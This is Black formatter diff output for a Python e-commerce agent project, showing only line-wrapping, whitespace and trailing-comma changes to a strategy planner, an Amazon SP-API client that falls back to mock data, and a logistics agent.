+            f"Plan includes {len(plan.initiatives)} initiatives with expected ROI of {plan.expected_roi:.1f}%."
+        )
+
         if situation_analysis.get("competitive_advantages"):
             advantages = situation_analysis["competitive_advantages"]
-            reasoning_parts.append(f"Leverages existing strengths: {', '.join(advantages[:2])}.")
-        
+            reasoning_parts.append(
+                f"Leverages existing strengths: {', '.join(advantages[:2])}."
+            )
+
         if situation_analysis.get("key_challenges"):
             challenges = situation_analysis["key_challenges"]
-            reasoning_parts.append(f"Addresses key challenges: {', '.join(challenges[:2])}.")
-        
-        reasoning_parts.append("Implementation roadmap provides structured approach with clear milestones.")
-        
+            reasoning_parts.append(
+                f"Addresses key challenges: {', '.join(challenges[:2])}."
+            )
+
+        reasoning_parts.append(
+            "Implementation roadmap provides structured approach with clear milestones."
+        )
+
         return " ".join(reasoning_parts)
-    
+
     def _define_success_metrics(self, plan: StrategicPlan) -> List[str]:
         """Define success metrics for the strategic plan."""
         return [
             f"Achieve target ROI of {plan.expected_roi:.1f}%",
             "Complete 90% of planned initiatives on time",
             "Stay within 105% of allocated budget",
             "Maintain stakeholder satisfaction > 80%",
-            "Achieve all defined success criteria"
+            "Achieve all defined success criteria",
         ]
-    
+
     async def _generate_alternative_strategies(
-        self, 
-        objectives: List[BusinessObjective], 
-        situation_analysis: Dict[str, Any]
+        self, objectives: List[BusinessObjective], situation_analysis: Dict[str, Any]
     ) -> List[str]:
         """Generate alternative strategic approaches."""
         alternatives = []
-        
+
         # Conservative approach
-        alternatives.append("Conservative growth strategy focusing on operational efficiency and risk mitigation")
-        
+        alternatives.append(
+            "Conservative growth strategy focusing on operational efficiency and risk mitigation"
+        )
+
         # Aggressive approach
-        alternatives.append("Aggressive expansion strategy with higher investment and faster growth targets")
-        
+        alternatives.append(
+            "Aggressive expansion strategy with higher investment and faster growth targets"
+        )
+
         # Innovation-focused approach
-        alternatives.append("Innovation-led strategy emphasizing product development and market disruption")
-        
+        alternatives.append(
+            "Innovation-led strategy emphasizing product development and market disruption"
+        )
+
         # Partnership approach
-        alternatives.append("Partnership-based strategy leveraging strategic alliances and collaborations")
-        
+        alternatives.append(
+            "Partnership-based strategy leveraging strategic alliances and collaborations"
+        )
+
         return alternatives
-    
-    async def _create_fallback_plan(self, objectives: List[BusinessObjective], time_horizon: str) -> StrategicRecommendation:
+
+    async def _create_fallback_plan(
+        self, objectives: List[BusinessObjective], time_horizon: str
+    ) -> StrategicRecommendation:
         """Create a basic fallback plan when detailed analysis fails."""
         basic_initiative = BusinessInitiative(
             name="Business Optimization Initiative",
             description="General business improvement and optimization",
             objective=objectives[0] if objectives else BusinessObjective.REVENUE_GROWTH,
             priority=Priority.MEDIUM,
             estimated_cost=Decimal("25000"),
             estimated_revenue=Decimal("31250"),
             estimated_roi=25.0,
-            timeline_months=6
-        )
-        
+            timeline_months=6,
+        )
+
         basic_plan = StrategicPlan(
             name=f"Basic Strategic Plan - {time_horizon}",
             description="Basic strategic plan for business improvement",
             time_horizon=time_horizon,
             objectives=objectives,
             initiatives=[basic_initiative],
             total_budget=Decimal("25000"),
             expected_roi=25.0,
-            status="draft"
-        )
-        
+            status="draft",
+        )
+
         return StrategicRecommendation(
             plan=basic_plan,
             confidence_score=0.5,
             reasoning="Basic strategic plan created due to limited analysis data.",
             implementation_roadmap=[],
             resource_requirements={"budget": 25000, "team_size": 2},
             risk_mitigation=["Regular monitoring", "Phased implementation"],
             success_metrics=["Achieve 25% ROI", "Complete within 6 months"],
-            alternative_strategies=["Conservative approach", "Aggressive growth"]
-        )
-    
+            alternative_strategies=["Conservative approach", "Aggressive growth"],
+        )
+
     def _calculate_resource_requirements(self, plan: StrategicPlan) -> Dict[str, Any]:
         """Calculate total resource requirements for the plan."""
         total_budget = float(plan.total_budget)
         total_team_size = sum(
             init.required_resources.get("team_size", 2) for init in plan.initiatives
         )
-        
+
         return {
             "total_budget": total_budget,
             "team_size": total_team_size,
             "timeline": plan.time_horizon,
             "key_skills": ["Project management", "Strategic planning", "Data analysis"],
-            "technology_requirements": ["Project management tools", "Analytics platform"],
-            "external_resources": ["Consultants", "Training programs"]
+            "technology_requirements": [
+                "Project management tools",
+                "Analytics platform",
+            ],
+            "external_resources": ["Consultants", "Training programs"],
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/strategy_planner.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/__init__.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/__init__.py	2025-06-19 04:03:40.224250+00:00
@@ -18,11 +18,11 @@
 )
 from .trend_detector import TrendDetector
 
 __all__ = [
     "AdvertisingAgent",
-    "CompetitorAnalyzer", 
+    "CompetitorAnalyzer",
     "ListingAgent",
     "MarketAnalyzer",
     "TrendDetector",
     "CompetitorProfile",
     "MarketData",
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/amazon_client.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/amazon_client.py	2025-06-19 04:03:40.918161+00:00
@@ -19,48 +19,57 @@
 import hmac
 import urllib.parse
 from urllib.parse import urlencode
 
 from fs_agt_clean.core.models.marketplace_models import (
-    ProductListing, ProductIdentifier, Price, InventoryStatus, 
-    MarketplaceType, ProductCondition, ListingStatus, MarketMetrics
+    ProductListing,
+    ProductIdentifier,
+    Price,
+    InventoryStatus,
+    MarketplaceType,
+    ProductCondition,
+    ListingStatus,
+    MarketMetrics,
 )
 
 logger = logging.getLogger(__name__)
 
 
 class AmazonAPIError(Exception):
     """Custom exception for Amazon API errors."""
+
     pass
 
 
 class AmazonAuthenticationError(AmazonAPIError):
     """Authentication-related errors."""
+
     pass
 
 
 class AmazonRateLimitError(AmazonAPIError):
     """Rate limiting errors."""
+
     pass
 
 
 class AmazonClient:
     """Amazon SP-API client for marketplace operations."""
-    
+
     def __init__(
         self,
         client_id: Optional[str] = None,
         client_secret: Optional[str] = None,
         refresh_token: Optional[str] = None,
         access_key_id: Optional[str] = None,
         secret_access_key: Optional[str] = None,
         region: str = "us-east-1",
-        marketplace_id: str = "ATVPDKIKX0DER"  # US marketplace
+        marketplace_id: str = "ATVPDKIKX0DER",  # US marketplace
     ):
         """
         Initialize Amazon SP-API client.
-        
+
         Args:
             client_id: LWA client identifier
             client_secret: LWA client secret
             refresh_token: LWA refresh token
             access_key_id: AWS access key ID
@@ -72,130 +81,144 @@
         self.client_id = client_id or os.getenv("AMAZON_CLIENT_ID")
         self.client_secret = client_secret or os.getenv("AMAZON_CLIENT_SECRET")
         self.refresh_token = refresh_token or os.getenv("AMAZON_REFRESH_TOKEN")
         self.access_key_id = access_key_id or os.getenv("AWS_ACCESS_KEY_ID")
         self.secret_access_key = secret_access_key or os.getenv("AWS_SECRET_ACCESS_KEY")
-        
+
         self.region = region
         self.marketplace_id = marketplace_id
         self.base_url = f"https://sellingpartnerapi-na.amazon.com"
-        
+
         # Token management
         self.access_token = None
         self.token_expires_at = None
-        
+
         # Rate limiting
         self.last_request_time = {}
         self.request_counts = {}
-        
+
         # Session for HTTP requests
         self.session = None
-        
+
         logger.info(f"Amazon client initialized for marketplace {marketplace_id}")
-    
+
     async def __aenter__(self):
         """Async context manager entry."""
         self.session = aiohttp.ClientSession()
         return self
-    
+
     async def __aexit__(self, exc_type, exc_val, exc_tb):
         """Async context manager exit."""
         if self.session:
             await self.session.close()
-    
+
     async def _get_access_token(self) -> str:
         """Get or refresh access token."""
         if self.access_token and self.token_expires_at:
             if datetime.now(timezone.utc) < self.token_expires_at:
                 return self.access_token
-        
+
         # Refresh token
         if not self.client_id or not self.client_secret or not self.refresh_token:
-            raise AmazonAuthenticationError("Missing required credentials for token refresh")
-        
+            raise AmazonAuthenticationError(
+                "Missing required credentials for token refresh"
+            )
+
         token_url = "https://api.amazon.com/auth/o2/token"
         data = {
             "grant_type": "refresh_token",
             "refresh_token": self.refresh_token,
             "client_id": self.client_id,
-            "client_secret": self.client_secret
+            "client_secret": self.client_secret,
         }
-        
+
         try:
             async with self.session.post(token_url, data=data) as response:
                 if response.status == 200:
                     token_data = await response.json()
                     self.access_token = token_data["access_token"]
                     expires_in = token_data.get("expires_in", 3600)
-                    self.token_expires_at = datetime.now(timezone.utc) + timedelta(seconds=expires_in - 60)
+                    self.token_expires_at = datetime.now(timezone.utc) + timedelta(
+                        seconds=expires_in - 60
+                    )
                     logger.info("Amazon access token refreshed successfully")
                     return self.access_token
                 else:
                     error_text = await response.text()
-                    raise AmazonAuthenticationError(f"Token refresh failed: {error_text}")
+                    raise AmazonAuthenticationError(
+                        f"Token refresh failed: {error_text}"
+                    )
         except Exception as e:
             logger.error(f"Error refreshing Amazon token: {e}")
             raise AmazonAuthenticationError(f"Token refresh error: {e}")
-    
+
     async def _make_request(
-        self, 
-        method: str, 
-        endpoint: str, 
+        self,
+        method: str,
+        endpoint: str,
         params: Optional[Dict] = None,
-        data: Optional[Dict] = None
+        data: Optional[Dict] = None,
     ) -> Dict[str, Any]:
         """Make authenticated request to Amazon SP-API."""
         if not self.session:
-            raise AmazonAPIError("Client session not initialized. Use async context manager.")
-        
+            raise AmazonAPIError(
+                "Client session not initialized. Use async context manager."
+            )
+
         # Get access token
         access_token = await self._get_access_token()
-        
+
         # Prepare headers
         headers = {
             "Authorization": f"Bearer {access_token}",
             "Content-Type": "application/json",
-            "x-amz-access-token": access_token
+            "x-amz-access-token": access_token,
         }
-        
+
         # Build URL
         url = f"{self.base_url}{endpoint}"
         if params:
             url += "?" + urlencode(params)
-        
+
         # Rate limiting check
         await self._check_rate_limits(endpoint)
-        
-        try:
-            async with self.session.request(method, url, headers=headers, json=data) as response:
+
+        try:
+            async with self.session.request(
+                method, url, headers=headers, json=data
+            ) as response:
                 response_data = await response.json()
-                
+
                 if response.status == 200:
                     return response_data
                 elif response.status == 429:
                     raise AmazonRateLimitError("Rate limit exceeded")
                 elif response.status in [401, 403]:
-                    raise AmazonAuthenticationError(f"Authentication failed: {response_data}")
+                    raise AmazonAuthenticationError(
+                        f"Authentication failed: {response_data}"
+                    )
                 else:
-                    raise AmazonAPIError(f"API request failed: {response.status} - {response_data}")
-                    
+                    raise AmazonAPIError(
+                        f"API request failed: {response.status} - {response_data}"
+                    )
+
         except aiohttp.ClientError as e:
             logger.error(f"HTTP error in Amazon API request: {e}")
             raise AmazonAPIError(f"HTTP error: {e}")
-    
+
     async def _check_rate_limits(self, endpoint: str):
         """Check and enforce rate limits."""
         now = datetime.now(timezone.utc)
-        
+
         # Simple rate limiting - can be enhanced
         if endpoint in self.last_request_time:
             time_since_last = (now - self.last_request_time[endpoint]).total_seconds()
             if time_since_last < 1.0:  # Minimum 1 second between requests
                 await asyncio.sleep(1.0 - time_since_last)
-        
+
         self.last_request_time[endpoint] = now
-    
+
     async def get_product_details(self, asin: str) -> Optional[ProductListing]:
         """
         Get product details by ASIN.
 
         Args:
@@ -205,18 +228,20 @@
             ProductListing object or None if not found
         """
         try:
             # Check if we have real credentials
             if not self.client_id or not self.client_secret or not self.refresh_token:
-                logger.info(f"No Amazon credentials configured, returning mock data for ASIN {asin}")
+                logger.info(
+                    f"No Amazon credentials configured, returning mock data for ASIN {asin}"
+                )
                 return self._create_mock_product_listing(asin)
 
             # In a real implementation, this would call the actual SP-API
             endpoint = f"/catalog/2022-04-01/items/{asin}"
             params = {
                 "marketplaceIds": self.marketplace_id,
-                "includedData": "attributes,dimensions,identifiers,images,productTypes,salesRanks,summaries"
+                "includedData": "attributes,dimensions,identifiers,images,productTypes,salesRanks,summaries",
             }
 
             response = await self._make_request("GET", endpoint, params=params)
 
             # Parse response and create ProductListing
@@ -224,11 +249,11 @@
 
         except Exception as e:
             logger.error(f"Error getting product details for ASIN {asin}: {e}")
             # Return mock data as fallback
             return self._create_mock_product_listing(asin)
-    
+
     async def get_competitive_pricing(self, asin: str) -> List[Price]:
         """
         Get competitive pricing information for a product.
 
         Args:
@@ -238,18 +263,20 @@
             List of competitor prices
         """
         try:
             # Check if we have real credentials
             if not self.client_id or not self.client_secret or not self.refresh_token:
-                logger.info(f"No Amazon credentials configured, returning mock pricing for ASIN {asin}")
+                logger.info(
+                    f"No Amazon credentials configured, returning mock pricing for ASIN {asin}"
+                )
                 return self._create_mock_competitive_prices(asin)
 
             endpoint = f"/products/pricing/v0/price"
             params = {
                 "MarketplaceId": self.marketplace_id,
                 "Asins": asin,
-                "ItemType": "Asin"
+                "ItemType": "Asin",
             }
 
             response = await self._make_request("GET", endpoint, params=params)
 
             # Parse competitive pricing
@@ -257,11 +284,11 @@
 
         except Exception as e:
             logger.error(f"Error getting competitive pricing for ASIN {asin}: {e}")
             # Return mock data as fallback
             return self._create_mock_competitive_prices(asin)
-    
+
     async def get_inventory_status(self, sku: str) -> Optional[InventoryStatus]:
         """
         Get inventory status for a SKU.
 
         Args:
@@ -271,19 +298,21 @@
             InventoryStatus object or None if not found
         """
         try:
             # Check if we have real credentials
             if not self.client_id or not self.client_secret or not self.refresh_token:
-                logger.info(f"No Amazon credentials configured, returning mock inventory for SKU {sku}")
+                logger.info(
+                    f"No Amazon credentials configured, returning mock inventory for SKU {sku}"
+                )
                 return self._create_mock_inventory_status(sku)
 
             endpoint = "/fba/inventory/v1/summaries"
             params = {
                 "details": "true",
                 "granularityType": "Marketplace",
                 "granularityId": self.marketplace_id,
-                "marketplaceIds": self.marketplace_id
+                "marketplaceIds": self.marketplace_id,
             }
 
             response = await self._make_request("GET", endpoint, params=params)
 
             # Parse inventory response
@@ -291,73 +320,89 @@
 
         except Exception as e:
             logger.error(f"Error getting inventory status for SKU {sku}: {e}")
             # Return mock data as fallback
             return self._create_mock_inventory_status(sku)
-    
-    async def get_sales_metrics(self, asin: str, days: int = 30) -> Optional[MarketMetrics]:
+
+    async def get_sales_metrics(
+        self, asin: str, days: int = 30
+    ) -> Optional[MarketMetrics]:
         """
         Get sales metrics for a product.
-        
+
         Args:
             asin: Amazon Standard Identification Number
             days: Number of days to look back
-            
+
         Returns:
             MarketMetrics object or None if not available
         """
         try:
             # This would use the Sales Analytics API in a real implementation
             # For now, return mock data
             return self._create_mock_sales_metrics(asin, days)
-            
+
         except Exception as e:
             logger.error(f"Error getting sales metrics for ASIN {asin}: {e}")
             return None
-    
+
     def _create_mock_product_listing(self, asin: str) -> ProductListing:
         """Create mock product listing for development."""
         return ProductListing(
             identifier=ProductIdentifier(asin=asin, sku=f"SKU-{asin}"),
             title=f"Sample Product {asin}",
             description=f"This is a sample product description for ASIN {asin}",
             marketplace=MarketplaceType.AMAZON,
             seller_id="SAMPLE_SELLER",
             condition=ProductCondition.NEW,
             status=ListingStatus.ACTIVE,
-            current_price=Price(amount=Decimal("29.99"), marketplace=MarketplaceType.AMAZON),
+            current_price=Price(
+                amount=Decimal("29.99"), marketplace=MarketplaceType.AMAZON
+            ),
             quantity_available=100,
             categories=["Electronics", "Gadgets"],
             seller_rating=4.5,
             review_count=150,
             average_rating=4.2,
-            listing_url=f"https://amazon.com/dp/{asin}"
+            listing_url=f"https://amazon.com/dp/{asin}",
         )
-    
+
     def _create_mock_competitive_prices(self, asin: str) -> List[Price]:
         """Create mock competitive prices for development."""
         base_price = 29.99
         return [
-            Price(amount=Decimal(str(base_price * 0.95)), marketplace=MarketplaceType.AMAZON),
-            Price(amount=Decimal(str(base_price * 1.05)), marketplace=MarketplaceType.AMAZON),
-            Price(amount=Decimal(str(base_price * 0.98)), marketplace=MarketplaceType.AMAZON),
-            Price(amount=Decimal(str(base_price * 1.12)), marketplace=MarketplaceType.AMAZON),
+            Price(
+                amount=Decimal(str(base_price * 0.95)),
+                marketplace=MarketplaceType.AMAZON,
+            ),
+            Price(
+                amount=Decimal(str(base_price * 1.05)),
+                marketplace=MarketplaceType.AMAZON,
+            ),
+            Price(
+                amount=Decimal(str(base_price * 0.98)),
+                marketplace=MarketplaceType.AMAZON,
+            ),
+            Price(
+                amount=Decimal(str(base_price * 1.12)),
+                marketplace=MarketplaceType.AMAZON,
+            ),
         ]
-    
+
     def _create_mock_inventory_status(self, sku: str) -> InventoryStatus:
         """Create mock inventory status for development."""
         return InventoryStatus(
             product_id=ProductIdentifier(sku=sku),
             marketplace=MarketplaceType.AMAZON,
             quantity_available=75,
             quantity_reserved=5,
             quantity_inbound=20,
             reorder_point=25,
             max_stock_level=200,
-            fulfillment_method="FBA"
+            fulfillment_method="FBA",
         )
-    
+
     def _create_mock_sales_metrics(self, asin: str, days: int) -> MarketMetrics:
         """Create mock sales metrics for development."""
         return MarketMetrics(
             marketplace=MarketplaceType.AMAZON,
             product_id=ProductIdentifier(asin=asin),
@@ -365,31 +410,31 @@
             category_rank=250,
             buy_box_percentage=85.5,
             conversion_rate=12.3,
             units_sold=45,
             revenue=Decimal("1347.55"),
-            profit_margin=0.25
+            profit_margin=0.25,
         )
-    
+
     def _parse_product_response(self, response: Dict, asin: str) -> ProductListing:
         """Parse Amazon API product response into ProductListing."""
         # This would parse the actual API response
         # For now, return mock data
         return self._create_mock_product_listing(asin)
-    
+
     def _parse_competitive_pricing(self, response: Dict) -> List[Price]:
         """Parse competitive pricing response."""
         # This would parse the actual API response
         # For now, return mock data
         return self._create_mock_competitive_prices("sample")
-    
+
     def _parse_inventory_response(self, response: Dict, sku: str) -> InventoryStatus:
         """Parse inventory response."""
         # This would parse the actual API response
         # For now, return mock data
         return self._create_mock_inventory_status(sku)
-    
+
     async def validate_credentials(self) -> bool:
         """Validate Amazon API credentials."""
         try:
             if not self.client_id or not self.client_secret or not self.refresh_token:
                 logger.warning("Amazon credentials not configured - using mock data")
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/amazon_client.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/logistics_agent.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/logistics_agent.py	2025-06-19 04:03:40.935525+00:00
@@ -13,11 +13,14 @@
 import logging
 import re
 from datetime import datetime, timezone
 from typing import Dict, List, Optional, Any
 
-from fs_agt_clean.agents.base_conversational_agent import BaseConversationalAgent, AgentResponse
+from fs_agt_clean.agents.base_conversational_agent import (
+    BaseConversationalAgent,
+    AgentResponse,
+)
 from fs_agt_clean.core.ai.prompt_templates import AgentRole
 
 # Import logistics services with error handling
 try:
     from fs_agt_clean.services.logistics.shipping_service import ShippingService
@@ -43,104 +46,140 @@
 
 
 class LogisticsAgent(BaseConversationalAgent):
     """
     Logistics Agent for comprehensive supply chain and fulfillment management.
-    
+
     Capabilities:
     - Shipping rate calculation and optimization
     - Inventory rebalancing recommendations
     - Carrier service management
     - Delivery tracking and status updates
     - Warehouse operations guidance
     - Fulfillment strategy optimization
     """
-    
+
     def __init__(self, agent_id: str = None):
         """Initialize the Logistics Agent."""
         super().__init__(
             agent_role=AgentRole.LOGISTICS,
-            agent_id=agent_id or f"logistics_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}"
+            agent_id=agent_id
+            or f"logistics_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}",
         )
 
         # Initialize logistics services with error handling
         try:
             self.shipping_service = ShippingService() if ShippingService else None
         except Exception:
             self.shipping_service = None
-            
+
         try:
             self.inventory_manager = InventoryManager() if InventoryManager else None
         except Exception:
             self.inventory_manager = None
-        
+
         # Initialize specialized agents
         self.warehouse_agent = None
         self.shipping_agent = None
-        
+
         # Logistics agent capabilities
         self.capabilities = [
             "shipping_optimization",
-            "inventory_rebalancing", 
+            "inventory_rebalancing",
             "carrier_management",
             "delivery_tracking",
             "warehouse_operations",
             "fulfillment_planning",
             "supply_chain_optimization",
-            "cost_analysis"
+            "cost_analysis",
         ]
-        
+
         # Logistics-specific patterns for message processing
         self.logistics_patterns = {
             "shipping": [
-                "ship", "shipping", "delivery", "carrier", "fedex", "ups", "usps",
-                "track", "tracking", "package", "label", "rate", "cost"
+                "ship",
+                "shipping",
+                "delivery",
+                "carrier",
+                "fedex",
+                "ups",
+                "usps",
+                "track",
+                "tracking",
+                "package",
+                "label",
+                "rate",
+                "cost",
             ],
             "inventory": [
-                "inventory", "stock", "rebalance", "warehouse", "storage", "fulfillment",
-                "reorder", "quantity", "availability", "allocation"
+                "inventory",
+                "stock",
+                "rebalance",
+                "warehouse",
+                "storage",
+                "fulfillment",
+                "reorder",
+                "quantity",
+                "availability",
+                "allocation",
             ],
             "tracking": [
-                "track", "tracking", "status", "delivery", "shipment", "package",
-                "where", "when", "arrived", "transit"
+                "track",
+                "tracking",
+                "status",
+                "delivery",
+                "shipment",
+                "package",
+                "where",
+                "when",
+                "arrived",
+                "transit",
             ],
             "optimization": [
-                "optimize", "improve", "efficiency", "cost", "reduce", "faster",
-                "better", "strategy", "plan", "recommend"
-            ]
+                "optimize",
+                "improve",
+                "efficiency",
+                "cost",
+                "reduce",
+                "faster",
+                "better",
+                "strategy",
+                "plan",
+                "recommend",
+            ],
         }
-        
+
         logger.info(f"Logistics Agent initialized: {self.agent_id}")
 
     async def process_message(
         self,
         message: str,
         user_id: str = "test_user",
         conversation_id: str = "test_conversation",
         conversation_history: Optional[List[Dict]] = None,
-        context: Dict[str, Any] = None
+        context: Dict[str, Any] = None,
     ) -> AgentResponse:
         """
         Process logistics-related queries and provide optimization guidance.
-        
+
         Args:
             message: User message requesting logistics assistance
             user_id: User identifier
             conversation_id: Conversation identifier
             conversation_history: Previous conversation messages
             context: Additional context for logistics operations
-            
+
         Returns:
             AgentResponse with logistics recommendations
         """
         try:
             # Classify the logistics request type
             request_type = self._classify_logistics_request(message)
-            
+
             # Extract logistics information from message
             logistics_info = self._extract_logistics_info(message, context or {})
-            
+
             # Generate logistics-specific response based on request type
             if request_type == "shipping":
                 response_data = await self._handle_shipping_request(
                     message, logistics_info, context or {}
                 )
@@ -158,56 +197,58 @@
                 )
             else:
                 response_data = await self._handle_general_logistics_query(
                     message, context or {}
                 )
-            
+
             # Generate LLM response with logistics context
-            llm_response = await self._generate_logistics_response(message, response_data, request_type)
-            
+            llm_response = await self._generate_logistics_response(
+                message, response_data, request_type
+            )
+
             return AgentResponse(
                 content=llm_response,
                 agent_type="logistics",
                 confidence=response_data.get("confidence", 0.8),
                 response_time=0.25,  # Mock response time
                 metadata={
                     "agent_id": self.agent_id,
                     "request_type": request_type,
                     "data": response_data,
-                    "requires_approval": response_data.get("requires_approval", False)
-                }
-            )
-            
+                    "requires_approval": response_data.get("requires_approval", False),
+                },
+            )
+
         except Exception as e:
             logger.error(f"Error processing logistics message: {e}")
             return AgentResponse(
                 content="I apologize, but I encountered an issue with your logistics request. Please provide more specific details about what type of logistics assistance you need.",
                 agent_type="logistics",
                 confidence=0.1,
                 response_time=0.1,
                 metadata={
                     "agent_id": self.agent_id,
                     "error": str(e),
-                    "requires_approval": False
-                }
+                    "requires_approval": False,
+                },
             )
 
     async def _process_response(
-        self, 
-        llm_response: str, 
-        original_message: str, 
-        conversation_id: str, 
-        context: Dict[str, Any]
+        self,
+        llm_response: str,
+        original_message: str,
+        conversation_id: str,
+        context: Dict[str, Any],
     ) -> str:
         """Process LLM response with logistics-specific enhancements."""
         try:
             # Classify the logistics request type
             request_type = self._classify_logistics_request(original_message)
-            
+
             # Extract logistics information from message
             logistics_info = self._extract_logistics_info(original_message, context)
-            
+
             # Enhance response based on request type
             if request_type == "shipping":
                 enhanced_response = await self._enhance_shipping_response(
                     llm_response, logistics_info, original_message
                 )
@@ -225,207 +266,205 @@
                 )
             else:
                 enhanced_response = await self._enhance_general_response(
                     llm_response, original_message
                 )
-            
+
             return enhanced_response
-            
+
         except Exception as e:
             logger.error(f"Error processing logistics response: {e}")
             return f"{llm_response}\n\n*Note: Some logistics features may be temporarily unavailable.*"
-    
+
     def _classify_logistics_request(self, message: str) -> str:
         """Classify the type of logistics request."""
         message_lower = message.lower()
-        
+
         # Count pattern matches for each category
         pattern_scores = {}
         for category, patterns in self.logistics_patterns.items():
             score = sum(1 for pattern in patterns if pattern in message_lower)
             pattern_scores[category] = score
-        
+
         # Return category with highest score, default to general
         if not pattern_scores or max(pattern_scores.values()) == 0:
             return "general"
-        
+
         return max(pattern_scores, key=pattern_scores.get)
-    
-    def _extract_logistics_info(self, message: str, context: Dict[str, Any]) -> Dict[str, Any]:
+
+    def _extract_logistics_info(
+        self, message: str, context: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Extract logistics information from the message and context."""
         logistics_info = {
             "tracking_number": None,
             "carrier": None,
             "destination": None,
             "weight": None,
             "dimensions": None,
             "service_type": None,
             "order_id": None,
             "sku": None,
-            "quantity": None
+            "quantity": None,
         }
-        
+
         # Extract tracking number patterns
         tracking_patterns = [
             r"tracking[:\s]+([A-Z0-9]{10,})",
             r"track[:\s]+([A-Z0-9]{10,})",
             r"([0-9]{12,22})",  # Common tracking number format
         ]
-        
+
         for pattern in tracking_patterns:
             match = re.search(pattern, message, re.IGNORECASE)
             if match:
                 logistics_info["tracking_number"] = match.group(1).strip()
                 break
-        
+
         # Extract carrier mentions
         carriers = ["fedex", "ups", "usps", "dhl", "amazon"]
         for carrier in carriers:
             if carrier in message.lower():
                 logistics_info["carrier"] = carrier.upper()
                 break
-        
+
         # Extract order ID patterns
         order_patterns = [
             r"order[:\s#]+([A-Z0-9\-]{6,})",
             r"order id[:\s]+([A-Z0-9\-]{6,})",
         ]
-        
+
         for pattern in order_patterns:
             match = re.search(pattern, message, re.IGNORECASE)
             if match:
                 logistics_info["order_id"] = match.group(1).strip()
                 break
-        
+
         # Extract quantity mentions
         quantity_pattern = r"(\d+)\s*(?:units?|pieces?|items?|qty)"
         quantity_match = re.search(quantity_pattern, message, re.IGNORECASE)
         if quantity_match:
             logistics_info["quantity"] = int(quantity_match.group(1))
-        
+
         return logistics_info
 
     # Required abstract methods from BaseConversationalAgent
-    
+
     async def _get_agent_context(self, conversation_id: str) -> Dict[str, Any]:
         """Get agent-specific context for prompt generation."""
         return {
             "agent_type": "logistics_optimization_specialist",
             "capabilities": self.capabilities,
             "specializations": [
                 "Shipping optimization",
-                "Inventory management", 
+                "Inventory management",
                 "Carrier coordination",
-                "Fulfillment planning"
+                "Fulfillment planning",
             ],
             "supported_carriers": ["FedEx", "UPS", "USPS", "DHL", "Amazon"],
-            "logistics_operations": ["shipping", "tracking", "inventory", "warehousing"]
+            "logistics_operations": [
+                "shipping",
+                "tracking",
+                "inventory",
+                "warehousing",
+            ],
         }
 
     # Handler methods for different logistics request types
 
     async def _handle_shipping_request(
-        self,
-        message: str,
-        logistics_info: Dict[str, Any],
-        context: Dict[str, Any]
+        self, message: str, logistics_info: Dict[str, Any], context: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Handle shipping-related requests."""
         try:
             # Generate shipping recommendations
             shipping_options = [
                 {
                     "carrier": "FedEx",
                     "service": "Ground",
                     "cost": 12.50,
                     "delivery_days": "3-5",
-                    "tracking": True
+                    "tracking": True,
                 },
                 {
                     "carrier": "UPS",
                     "service": "Ground",
                     "cost": 11.75,
                     "delivery_days": "3-5",
-                    "tracking": True
+                    "tracking": True,
                 },
                 {
                     "carrier": "USPS",
                     "service": "Priority Mail",
                     "cost": 8.95,
                     "delivery_days": "2-3",
-                    "tracking": True
-                }
+                    "tracking": True,
+                },
             ]
 
             recommendations = [
                 "Consider USPS Priority Mail for best value on small packages",
                 "Use FedEx or UPS for time-sensitive shipments",
                 "Negotiate volume discounts for regular shipping",
-                "Implement zone skipping for cross-country shipments"
+                "Implement zone skipping for cross-country shipments",
             ]
 
             return {
                 "request_type": "shipping",
                 "shipping_options": shipping_options,
                 "recommendations": recommendations,
                 "confidence": 0.9,
-                "requires_approval": False
+                "requires_approval": False,
             }
 
         except Exception as e:
             logger.error(f"Error in shipping request: {e}")
             return {
                 "request_type": "shipping",
                 "error": str(e),
                 "confidence": 0.1,
-                "requires_approval": False
+                "requires_approval": False,
             }
 
     async def _handle_inventory_request(
-        self,
-        message: str,
-        logistics_info: Dict[str, Any],
-        context: Dict[str, Any]
+        self, message: str, logistics_info: Dict[str, Any], context: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Handle inventory management requests."""
         try:
             rebalancing_strategies = [
                 "Move slow-moving inventory to lower-cost storage",
                 "Redistribute high-demand items to multiple warehouses",
                 "Implement just-in-time ordering for fast-moving SKUs",
-                "Use seasonal forecasting for inventory planning"
+                "Use seasonal forecasting for inventory planning",
             ]
 
             optimization_tips = [
                 "Maintain 30-day safety stock for core products",
                 "Use ABC analysis for inventory prioritization",
                 "Implement automated reorder points",
-                "Monitor inventory turnover ratios monthly"
+                "Monitor inventory turnover ratios monthly",
             ]
 
             return {
                 "request_type": "inventory",
                 "rebalancing_strategies": rebalancing_strategies,
                 "optimization_tips": optimization_tips,
                 "confidence": 0.85,
-                "requires_approval": False
+                "requires_approval": False,
             }
 
         except Exception as e:
             logger.error(f"Error in inventory request: {e}")
             return {
                 "request_type": "inventory",
                 "error": str(e),
                 "confidence": 0.1,
-                "requires_approval": False
+                "requires_approval": False,
             }
 
     async def _handle_tracking_request(
-        self,
-        message: str,
-        logistics_info: Dict[str, Any],
-        context: Dict[str, Any]
+        self, message: str, logistics_info: Dict[str, Any], context: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Handle tracking and delivery status requests."""
         try:
             tracking_number = logistics_info.get("tracking_number")
             carrier = logistics_info.get("carrier", "Unknown")
@@ -435,112 +474,123 @@
                 "tracking_number": tracking_number or "1234567890",
                 "carrier": carrier,
                 "status": "In Transit",
                 "location": "Distribution Center - Chicago, IL",
                 "estimated_delivery": "Tomorrow by 8:00 PM",
